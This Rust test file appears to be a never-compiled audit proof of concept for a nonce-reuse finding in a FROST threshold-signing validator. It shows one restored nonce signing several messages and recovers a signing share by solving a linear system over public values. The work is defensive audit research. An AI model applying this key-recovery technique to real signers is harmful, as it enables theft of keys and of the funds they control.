//! PoC part 2 for F-VAL-033 — the consequence of the un-burned nonce: one FROST
//! nonce pair produces signature shares over two (and, after a second restore,
//! three) different messages, and three uses recover the signing share.
//!
//! NEVER COMPILED. See `README.md` in this directory.
//!
//! Include as a child of `crate::frost` by adding to
//! `crates/validator/src/frost/mod.rs`:
//!
//! ```ignore
//! #[cfg(test)]
//! #[path = "../../../../rust-audit/poc/F-VAL-033/nonce_reuse.rs"]
//! mod poc_f_val_033_reuse;
//! ```
//!
//! It lives under `crate::frost` because it needs `frost::marshal` (private to
//! that module) and `KeyShare::as_key_package` (`pub(super)` there).

use super::{keygen, marshal, participants, preprocess, sign};
use crate::bindings;
use alloy::primitives::{Address, B256, U256, address, keccak256};
use frost_secp256k1::{Identifier, SigningPackage, round1};
use k256::{
    ProjectivePoint, Scalar,
    elliptic_curve::{
        hash2curve::{self, ExpandMsgXmd},
        sec1::ToEncodedPoint as _,
    },
    sha2::Sha256,
};
#[allow(unused_imports)]
use k256::elliptic_curve::{Field as _, PrimeField as _};
use std::collections::BTreeMap;

const PARTICIPANTS: [Address; 3] = [
    address!("f39Fd6e51aad88F6F4ce6aB8827279cffFb92266"),
    address!("70997970C51812dc3A010C7d01b50e0d17dc79C8"),
    address!("3C44CdDdB6a900fa2b585dd299e03d12FA4293BC"),
];
/// The validator whose database is restored and whose nonce is reused.
const VICTIM: Address = PARTICIPANTS[0];
/// The honest co-signer. It uses a *fresh* nonce each time, as it should.
const COSIGNER: Address = PARTICIPANTS[2];
const COUNT: u16 = 3;
const THRESHOLD: u16 = 2;

// ---------------------------------------------------------------------------
// Ciphersuite helpers.
//
// These reimplement two things the crate already does but does not expose to a
// sibling module: `frost::ecdh::hash_to_scalar` (private) and the RFC 9591
// FROST(secp256k1, SHA-256) challenge `H2`. `hash_to_scalar` is copied verbatim
// from `crates/validator/src/frost/ecdh.rs:123-132`, with a different
// discriminant.
// ---------------------------------------------------------------------------

fn hash_to_scalar(discriminant: &[u8], msg: &[u8]) -> Scalar {
    let mut u = [Scalar::ZERO];
    hash2curve::hash_to_field::<ExpandMsgXmd<Sha256>, Scalar>(
        &[msg],
        &[b"FROST-secp256k1-SHA256-v1", discriminant],
        &mut u,
    )
    .expect("hash to secp256k1 scalar never fails for a single output");
    u[0]
}

fn serialize_element(point: &ProjectivePoint) -> Vec<u8> {
    point.to_encoded_point(true).as_bytes().to_vec()
}

/// The FROST challenge `c = H2(SerializeElement(R) || SerializeElement(PK) || msg)`.
///
/// Correctness of this derivation is *asserted inside the tests* against the
/// public verification equation `z·G == R + c·PK`, so a wrong DST would surface
/// as a clearly-labelled failure rather than as a silent wrong answer.
fn challenge(group_commitment: &ProjectivePoint, group_key: &ProjectivePoint, msg: &B256) -> Scalar {
    let mut input = serialize_element(group_commitment);
    input.extend_from_slice(&serialize_element(group_key));
    input.extend_from_slice(msg.as_slice());
    hash_to_scalar(b"chal", &input)
}

/// Copied from `crates/validator/src/frost/sign.rs:148-160`, which is private.
fn binding_factor_to_scalar(
    binding_factor: &frost_core::BindingFactor<frost_secp256k1::Secp256K1Sha256>,
) -> Scalar {
    Scalar::from_repr(
        <[u8; 32]>::try_from(binding_factor.serialize())
            .expect("binding factor always serializes the correct number of bytes")
            .into(),
    )
    .expect("binding factor is always a valid scalar")
}

fn to_scalar(value: U256) -> Scalar {
    marshal::frost_scalar(&value).expect("canonical scalar")
}

fn to_point(point: &bindings::Point) -> ProjectivePoint {
    marshal::frost_point(point).expect("valid point")
}

/// A single freshly sampled nonce pair for `key_share`.
fn fresh_nonce<R>(key_share: &keygen::KeyShare, rng: &mut R) -> preprocess::Nonces
where
    R: rand::RngCore + rand::CryptoRng,
{
    let mut chunk = preprocess::NonceChunk::with_size(1, key_share, rng).expect("nonce chunk");
    chunk.nonces.remove(0)
}

/// 3x3 determinant over the scalar field.
fn det3(m: [[Scalar; 3]; 3]) -> Scalar {
    m[0][0] * (m[1][1] * m[2][2] - m[1][2] * m[2][1])
        - m[0][1] * (m[1][0] * m[2][2] - m[1][2] * m[2][0])
        + m[0][2] * (m[1][0] * m[2][1] - m[1][1] * m[2][0])
}

// ---------------------------------------------------------------------------
// A finalized 2-of-3 group.
// ---------------------------------------------------------------------------

fn finalized_group() -> BTreeMap<Address, keygen::KeyShare> {
    let mut rng = rand::thread_rng();

    let mut secrets = BTreeMap::new();
    let mut commitments = BTreeMap::new();
    for participant in PARTICIPANTS {
        let s = keygen::setup(&mut rng, participant, COUNT, THRESHOLD).unwrap();
        commitments.insert(participant, s.commitment());
        secrets.insert(participant, s);
    }
    let verified = PARTICIPANTS
        .into_iter()
        .map(|p| (p, keygen::verify_commitment(p, &commitments[&p]).unwrap()))
        .collect::<BTreeMap<_, _>>();

    let mut sharing_states = BTreeMap::new();
    let mut shares = BTreeMap::new();
    for (participant, s) in secrets {
        let (state, share) = keygen::generate_secret_shares(s, verified.clone()).unwrap();
        sharing_states.insert(participant, state);
        shares.insert(participant, share);
    }

    sharing_states
        .into_iter()
        .map(|(participant, state)| {
            let verified_shares = shares
                .iter()
                .map(|(peer, share)| {
                    let (_, encrypted) =
                        keygen::verify_secret_share(state.group_commitments(), *peer, share)
                            .unwrap();
                    (
                        *peer,
                        keygen::verify_encrypted_secret_share(&state, *peer, encrypted).unwrap(),
                    )
                })
                .collect();
            let key_share = keygen::finalize(state, verified_shares).unwrap();
            (participant, key_share)
        })
        .collect()
}

/// Everything one signing round produces that an onchain observer can see.
struct Round {
    /// The victim's `(d, e)` reveal — identical in every round, which is the bug.
    victim_reveal: bindings::SignNonces,
    /// The victim's `z`.
    victim_z: Scalar,
    /// The victim's Lagrange coefficient `l`, published in its share.
    victim_lambda: Scalar,
    /// The victim's binding factor `rho`, recomputed from public data.
    victim_rho: Scalar,
    /// The challenge `c`, recomputed from public data.
    challenge: Scalar,
}

/// Runs one signing round in which the victim uses `victim_nonces` (the same
/// value every round) and the co-signer uses `cosigner_nonces` (fresh).
fn signing_round(
    key_shares: &BTreeMap<Address, keygen::KeyShare>,
    victim_nonces: preprocess::Nonces,
    cosigner_nonces: preprocess::Nonces,
    message: &B256,
) -> Round {
    let (victim_reveal, _) = victim_nonces.reveal();
    let (cosigner_reveal, _) = cosigner_nonces.reveal();

    let revealed = [(VICTIM, &victim_reveal), (COSIGNER, &cosigner_reveal)]
        .into_iter()
        .map(|(address, nonces)| {
            (
                address,
                sign::verify_revealed_nonces(address, nonces).unwrap(),
            )
        })
        .collect::<BTreeMap<_, _>>();

    let victim_share =
        sign::signature_share(&key_shares[&VICTIM], victim_nonces, &revealed, message).unwrap();
    let cosigner_share =
        sign::signature_share(&key_shares[&COSIGNER], cosigner_nonces, &revealed, message).unwrap();

    // Everything below is recomputed from public data only.
    let group_key = key_shares[&VICTIM]
        .as_key_package()
        .verifying_key()
        .to_element();
    let group_commitment = to_point(&victim_share.selection.r);
    let c = challenge(&group_commitment, &group_key, message);

    // Sanity-check the challenge derivation against the public FROST
    // verification equation `z·G == R + c·PK`, with `z` the sum of the shares.
    let z_aggregate = to_scalar(victim_share.share.z) + to_scalar(cosigner_share.share.z);
    assert_eq!(
        ProjectivePoint::GENERATOR * z_aggregate,
        group_commitment + group_key * c,
        "the challenge derivation in this PoC is wrong — see README §Known mechanical gap"
    );

    // Rebuild the signing package exactly as `frost::sign::signature_share`
    // does (`crates/validator/src/frost/sign.rs:69-90`) to recover the binding
    // factor.
    let commitments = [(VICTIM, &victim_reveal), (COSIGNER, &cosigner_reveal)]
        .into_iter()
        .map(|(address, nonces)| {
            (
                participants::identifier(address),
                marshal::frost_signing_commitments(nonces).unwrap(),
            )
        })
        .collect::<BTreeMap<Identifier, round1::SigningCommitments>>();
    let signing_package = SigningPackage::new(commitments, message.as_slice());
    let binding_factors = frost_core::compute_binding_factor_list(
        &signing_package,
        key_shares[&VICTIM].as_key_package().verifying_key(),
        &[],
    )
    .unwrap();
    let victim_rho = binding_factor_to_scalar(
        binding_factors
            .get(&participants::identifier(VICTIM))
            .expect("the victim is a signer"),
    );

    Round {
        victim_reveal,
        victim_z: to_scalar(victim_share.share.z),
        victim_lambda: to_scalar(victim_share.share.l),
        victim_rho,
        challenge: c,
    }
}

// ---------------------------------------------------------------------------
// Test 1 — one nonce, two messages.
// ---------------------------------------------------------------------------

/// One restore ⇒ one nonce pair signs two different messages.
///
/// PASS ⇒ the exact condition PROMPT.md §8 names Critical ("nonce reuse") is
/// realised: the same `(d, e)` appears in two `signRevealNonces` reveals bound
/// to two different messages, with two different `z` values, both public.
///
/// FAIL, at `assert_ne!(z1, z2)` ⇒ the two messages produced the same share,
/// which would mean the signing is not message-bound; investigate, because that
/// would be a *different* and worse bug.
/// FAIL, at `assert_eq!(reveal1, reveal2)` ⇒ the commitments are not a pure
/// function of the stored nonce and F-VAL-033's consequence does not follow.
#[test]
fn one_nonce_signs_two_messages() {
    let key_shares = finalized_group();
    let mut rng = rand::thread_rng();

    // The restored nonce: one value, cloned for each use. This is exactly what
    // `store_restore.rs` shows `take_nonce` handing out twice.
    let restored = fresh_nonce(&key_shares[&VICTIM], &mut rng);

    // Message `m` on the pre-reorg branch and `m'` on the post-reorg branch.
    // Under A2 these are attacker-chosen: the `sign()` entry point is
    // permissionless (`contracts/src/FROSTCoordinator.sol:530-542`).
    let m = keccak256(b"transfer 1 wei to the safe owner");
    let m_prime = keccak256(b"transfer the entire balance to the attacker");
    assert_ne!(m, m_prime);

    let cosigner_first = fresh_nonce(&key_shares[&COSIGNER], &mut rng);
    let cosigner_second = fresh_nonce(&key_shares[&COSIGNER], &mut rng);
    let first = signing_round(&key_shares, restored.clone(), cosigner_first, &m);
    let second = signing_round(&key_shares, restored.clone(), cosigner_second, &m_prime);

    assert_eq!(
        first.victim_reveal, second.victim_reveal,
        "the SAME (d, e) nonce commitment pair was revealed for both messages"
    );
    assert_ne!(
        first.victim_z, second.victim_z,
        "and two different signature shares were produced over it"
    );

    // Two equations in three unknowns (d, e, s). Not yet key recovery — see
    // `three_uses_recover_the_signing_share`.
}

// ---------------------------------------------------------------------------
// Test 2 — three uses recover the signing share.
// ---------------------------------------------------------------------------

/// Two restores of the same backup ⇒ three uses ⇒ full recovery of the
/// victim's FROST signing share.
///
/// Each use gives one linear equation over the scalar field:
/// `z_j = d + rho_j * e + lambda_j * c_j * s`, with `rho_j`, `lambda_j` and
/// `c_j` all publicly computable and `d`, `e`, `s` the unknowns. Three uses make
/// a 3x3 system; Cramer's rule gives `s`.
///
/// PASS ⇒ the final `assert_eq!` matches the victim's real signing share. The
/// finding's Critical severity is confirmed under the *stronger* of the two
/// severity headings in PROMPT.md §8 — not just "nonce reuse" but "recovery of
/// FROST key shares". Certainty for the arithmetic reaches `E1`; the certainty
/// of the finding as a whole is still bounded by the operator-restore step,
/// which no test can establish.
///
/// FAIL at the final `assert_eq!` while `one_nonce_signs_two_messages` passes ⇒
/// the share equation assumed here is not the one `round2::sign` implements;
/// print the residual and re-derive. This does **not** refute the finding, only
/// the key-recovery escalation.
///
/// NOTE ON REACHABILITY: three uses of one nonce need the stale backup to be
/// restored twice (each restore un-burns the row, and each subsequent
/// `take_nonce` re-burns it), or one restore plus one further reorg-rebind
/// before the validator re-syncs past the second burn. Reviewer R5 declined to
/// claim key recovery for this reason and Critic C-VAL-B agreed; this test
/// establishes what the arithmetic gives *if* the third use occurs, and should
/// be reported as such.
#[test]
fn three_uses_recover_the_signing_share() {
    let key_shares = finalized_group();
    let mut rng = rand::thread_rng();

    let restored = fresh_nonce(&key_shares[&VICTIM], &mut rng);

    let messages = [
        keccak256(b"branch A: transfer 1 wei"),
        keccak256(b"branch B: transfer 2 wei"),
        keccak256(b"branch C: transfer 3 wei"),
    ];

    let rounds = messages
        .iter()
        .map(|message| {
            let cosigner = fresh_nonce(&key_shares[&COSIGNER], &mut rng);
            signing_round(&key_shares, restored.clone(), cosigner, message)
        })
        .collect::<Vec<_>>();

    for round in &rounds[1..] {
        assert_eq!(
            round.victim_reveal, rounds[0].victim_reveal,
            "all three rounds reveal the same (d, e)"
        );
    }

    // Rows of [1, rho_j, lambda_j * c_j]; right-hand side z_j.
    let row = |r: &Round| [Scalar::ONE, r.victim_rho, r.victim_lambda * r.challenge];
    let m = [row(&rounds[0]), row(&rounds[1]), row(&rounds[2])];
    let z = [
        rounds[0].victim_z,
        rounds[1].victim_z,
        rounds[2].victim_z,
    ];

    let determinant = det3(m);
    assert_ne!(
        determinant,
        Scalar::ZERO,
        "the three uses must be linearly independent; if this trips, the messages \
         accidentally produced a degenerate system — change them and rerun"
    );

    // Replace the third column (the `s` column) with the right-hand side.
    let mut m_s = m;
    for j in 0..3 {
        m_s[j][2] = z[j];
    }
    let recovered = det3(m_s) * determinant.invert().unwrap();

    let real = key_shares[&VICTIM]
        .as_key_package()
        .signing_share()
        .to_scalar();
    assert_eq!(
        marshal::solidity_scalar(&recovered),
        marshal::solidity_scalar(&real),
        "three uses of one nonce recovered the victim's FROST signing share"
    );
}
